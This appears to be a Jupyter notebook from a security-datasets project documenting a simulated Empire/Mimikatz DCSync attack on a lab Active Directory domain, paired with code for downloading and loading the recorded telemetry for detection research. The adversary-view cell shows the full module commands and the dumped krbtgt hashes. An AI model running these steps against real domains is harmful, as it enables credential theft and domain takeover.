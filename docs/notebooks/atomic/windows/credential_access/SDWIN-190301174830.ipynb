{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "cb5279ef",
   "metadata": {},
   "source": [
    "# Empire DCSync"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "072e498c",
   "metadata": {},
   "source": [
    "## Metadata"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "1759d542",
   "metadata": {},
   "source": [
    "\n",
    "|                   |    |\n",
    "|:------------------|:---|\n",
    "| Contributors      | Roberto Rodriguez @Cyb3rWard0g |\n",
    "| Creation Date     | 2019/03/01 |\n",
    "| Modification Date | 2020/09/20 |\n",
    "| Tactics           | [TA0006](https://attack.mitre.org/tactics/TA0006) |\n",
    "| Techniques        | [T1003.006](https://attack.mitre.org/techniques/T1003/006) |\n",
    "| Tags              | AD Replication services,RPC DRSUAPI DsGetNCChanges |"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "03ddec60",
   "metadata": {},
   "source": [
    "## Dataset Description\n",
    "This dataset represents adversaries abusing Active Directory Replication services to retrieve secret domain data (i.e. NTLM hashes) from domain accounts."
   ]
  },
  {
   "cell_type": "markdown",
   "id": "089c5ec6",
   "metadata": {},
   "source": [
    "## Datasets Downloads"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "e8c0c961",
   "metadata": {},
   "source": [
    "\n",
    "| Type | Link   |\n",
    "|:-------------|:-------|\n",
    "| Host | [https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/credential_access/host/empire_dcsync_dcerpc_drsuapi_DsGetNCChanges.zip](https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/credential_access/host/empire_dcsync_dcerpc_drsuapi_DsGetNCChanges.zip) |\n",
    "| Network | [https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/credential_access/network/empire_dcsync_dcerpc_drsuapi_DsGetNCChanges.zip](https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/credential_access/network/empire_dcsync_dcerpc_drsuapi_DsGetNCChanges.zip) |"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "45b5a34e",
   "metadata": {},
   "source": [
    "## Simulation Metadata"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "932c2849",
   "metadata": {},
   "source": [
    "### Tools"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "cb07d2af",
   "metadata": {},
   "source": [
    "\n",
    "| type | Name | Module |\n",
    "|:-----|:-----|--------|\n",
    "| C2 | Empire | [DCSync](https://github.com/EmpireProject/Empire/blob/dev/data/module_source/credentials/Invoke-DCSync.ps1) |"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "1e26aa14",
   "metadata": {},
   "source": [
    "## Adversary View\n",
    "```\n",
    "(Empire: stager/multi/launcher) > agents\n",
    "\n",
    "[*] Active agents:\n",
    "\n",
    "Name     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener\n",
    "----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------\n",
    "4SUZ8X62 ps 172.18.39.5     WORKSTATION5      *THESHIRE\\pgustavo      powershell         4092   5/0.0    2020-09-21 21:59:29  http            \n",
    "1EHYPBVC ps 172.18.39.5     WORKSTATION5      *THESHIRE\\pgustavo      powershell         7456   5/0.0    2020-09-21 22:56:58  http            \n",
    "\n",
    "(Empire: agents) > interact 1EHYPBVC\n",
    "(Empire: 1EHYPBVC) > \n",
    "(Empire: 1EHYPBVC) > usemodule credentials/mimikatz/dcsync\n",
    "(Empire: powershell/credentials/mimikatz/dcsync) > set user krbtgt\n",
    "(Empire: powershell/credentials/mimikatz/dcsync) > set domain theshire.local\n",
    "(Empire: powershell/credentials/mimikatz/dcsync) > set dc MORDORDC.theshire.local\n",
    "(Empire: powershell/credentials/mimikatz/dcsync) > info\n",
    "\n",
    "              Name: Invoke-Mimikatz DCsync\n",
    "            Module: powershell/credentials/mimikatz/dcsync\n",
    "        NeedsAdmin: False\n",
    "        OpsecSafe: True\n",
    "          Language: powershell\n",
    "MinLanguageVersion: 2\n",
    "        Background: True\n",
    "  OutputExtension: None\n",
    "\n",
    "Authors:\n",
    "  @gentilkiwi\n",
    "  Vincent Le Toux\n",
    "  @JosephBialek\n",
    "\n",
    "Description:\n",
    "  Runs PowerSploit's Invoke-Mimikatz function to extract a\n",
    "  given account password through Mimikatz's lsadump::dcsync\n",
    "  module. This doesn't need code execution on a given DC, but\n",
    "  needs to be run from a user context with DA equivalent\n",
    "  privileges.\n",
    "\n",
    "Comments:\n",
    "  http://blog.gentilkiwi.com http://clymb3r.wordpress.com/\n",
    "\n",
    "Options:\n",
    "\n",
    "  Name   Required    Value                     Description\n",
    "  ----   --------    -------                   -----------\n",
    "  Agent  True        1EHYPBVC                  Agent to run module on.                 \n",
    "  user   True        krbtgt                    Username to extract the hash for        \n",
    "                                              (domain\\username format).               \n",
    "  domain False       theshire.local            Specified (fqdn) domain to pull for the \n",
    "                                              primary domain/DC.                      \n",
    "  dc     False       MORDORDC.theshire.local   Specified (fqdn) domain controller to   \n",
    "                                              pull replication data from.             \n",
    "\n",
    "(Empire: powershell/credentials/mimikatz/dcsync) > execute\n",
    "[*] Tasked 1EHYPBVC to run TASK_CMD_JOB\n",
    "[*] Agent 1EHYPBVC tasked with task ID 1\n",
    "[*] Tasked agent 1EHYPBVC to run module powershell/credentials/mimikatz/dcsync\n",
    "(Empire: powershell/credentials/mimikatz/dcsync) > \n",
    "Job started: 5PKMSU\n",
    "\n",
    "Hostname: WORKSTATION5.theshire.local / S-1-5-21-4228717743-1032521047-1810997296\n",
    "\n",
    "  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2020 20:07:46\n",
    ".## ^ ##.  \"A La Vie, A L'Amour\" - (oe.eo)\n",
    "## / \\ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )\n",
    "## \\ / ##       > http://blog.gentilkiwi.com/mimikatz\n",
    "'## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )\n",
    "  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/\n",
    "\n",
    "mimikatz(powershell) # lsadump::dcsync /user:krbtgt /domain:theshire.local /dc:MORDORDC.theshire.local\n",
    "[DC] 'theshire.local' will be the domain\n",
    "[DC] 'MORDORDC.theshire.local' will be the DC server\n",
    "[DC] 'krbtgt' will be the user account\n",
    "\n",
    "Object RDN           : krbtgt\n",
    "\n",
    "** SAM ACCOUNT **\n",
    "\n",
    "SAM Username         : krbtgt\n",
    "Account Type         : 30000000 ( USER_OBJECT )\n",
    "User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )\n",
    "Account expiration   : \n",
    "Password last change : 9/17/2020 11:14:46 AM\n",
    "Object Security ID   : S-1-5-21-4228717743-1032521047-1810997296-502\n",
    "Object Relative ID   : 502\n",
    "\n",
    "Credentials:\n",
    "  Hash NTLM: c2547afe54ff225a546c48805714d000\n",
    "    ntlm- 0: c2547afe54ff225a546c48805714d000\n",
    "    lm  - 0: 376c6c28a8cfd97055be910640a24428\n",
    "\n",
    "Supplemental Credentials:\n",
    "* Primary:NTLM-Strong-NTOWF *\n",
    "    Random Value : a69dcd105b2fc3955a3f52ca00a26902\n",
    "\n",
    "* Primary:Kerberos-Newer-Keys *\n",
    "    Default Salt : THESHIRE.LOCALkrbtgt\n",
    "    Default Iterations : 4096\n",
    "    Credentials\n",
    "      aes256_hmac       (4096) : 2954d183aaca51936dea10ea187e198814fa57b136733ca167b5d3fcc5b6ab2a\n",
    "      aes128_hmac       (4096) : a8811f9942540c8f10c3837a6975d446\n",
    "      des_cbc_md5       (4096) : e36d674cc7c8b983\n",
    "\n",
    "* Primary:Kerberos *\n",
    "    Default Salt : THESHIRE.LOCALkrbtgt\n",
    "    Credentials\n",
    "      des_cbc_md5       : e36d674cc7c8b983\n",
    "\n",
    "* Packages *\n",
    "    NTLM-Strong-NTOWF\n",
    "\n",
    "* Primary:WDigest *\n",
    "    01  774cc07151941eb115c0fd700fa5715b\n",
    "    02  6a75ae70376df6a3a3e23f560890ac90\n",
    "    03  cd5fa9ee1e6ab120cd6edb6970f56f38\n",
    "    04  774cc07151941eb115c0fd700fa5715b\n",
    "    05  6a75ae70376df6a3a3e23f560890ac90\n",
    "    06  168d6e12549fcbfa3931ffe79e6a978f\n",
    "    07  774cc07151941eb115c0fd700fa5715b\n",
    "    08  c2fc61fda20bbacb17fb29b10d7b8144\n",
    "    09  c2fc61fda20bbacb17fb29b10d7b8144\n",
    "    10  2985ad74f9f6f53e7533662687998542\n",
    "    11  4f58b2e2f9e8505a4b364b5c7bb0f0c5\n",
    "    12  c2fc61fda20bbacb17fb29b10d7b8144\n",
    "    13  61c34cf9f0bb6f8062250ffff84cda07\n",
    "    14  4f58b2e2f9e8505a4b364b5c7bb0f0c5\n",
    "    15  8a1d00b5e9c900715124c0998c19b909\n",
    "    16  8a1d00b5e9c900715124c0998c19b909\n",
    "    17  da88e05b3fe5adc93f5838eb33fadb98\n",
    "    18  45d131a894f854b5400167647aa5ae0f\n",
    "    19  2a1e106ba660636a95def3aad248ca6c\n",
    "    20  c05fa8a38b50e8c9088d3a64a7659817\n",
    "    21  28c03b871631ef39fc8cbc7fbb8e52e8\n",
    "    22  28c03b871631ef39fc8cbc7fbb8e52e8\n",
    "    23  5e1dceb9c5260211633323b398af827d\n",
    "    24  e3b40de14a439d9c18c57cc60002c5f5\n",
    "    25  e3b40de14a439d9c18c57cc60002c5f5\n",
    "    26  e52cde43b834f641f9f80190b29064a7\n",
    "    27  3b2e4b4ad448b19043d422dc9bf4fadc\n",
    "    28  0c45e5c4ef958888593d806c650f0e3d\n",
    "    29  1822249537162bad7b9808ae6b51c627\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "cebb4582",
   "metadata": {},
   "source": [
    "## Explore Datasets"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "4d2917f2",
   "metadata": {},
   "source": [
    "### Download & Decompress Dataset"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "8f78f144",
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests\n",
    "from zipfile import ZipFile\n",
    "from io import BytesIO\n",
    "\n",
    "url = https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/credential_access/host/empire_dcsync_dcerpc_drsuapi_DsGetNCChanges.zip\n",
    "zipFileRequest = requests.get(url)\n",
    "zipFile = ZipFile(BytesIO(zipFileRequest.content))\n",
    "datasetJSONPath = zipFile.extract(zipFile.namelist()[0])"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "e9029da3",
   "metadata": {},
   "source": [
    "### Read JSON File"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "b29c1fc1",
   "metadata": {},
   "outputs": [],
   "source": [
    "from pandas.io import json\n",
    "\n",
    "df = json.read_json(path_or_buf=datasetJSONPath, lines=True)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "5b69edce",
   "metadata": {},
   "source": [
    "### Access Security Events"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "6f6d9151",
   "metadata": {},
   "outputs": [],
   "source": [
    "df.groupby(['Channel']).size().sort_values(ascending=False)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "4abbfff5",
   "metadata": {},
   "source": [
    "## References\n",
    "* [https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1027.001/T1027.001.md#atomic-test-1---pad-binary-to-change-hash---linuxmacos-dd](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1027.001/T1027.001.md#atomic-test-1---pad-binary-to-change-hash---linuxmacos-dd) "
   ]
  }
 ],
 "metadata": {},
 "nbformat": 4,
 "nbformat_minor": 5
}
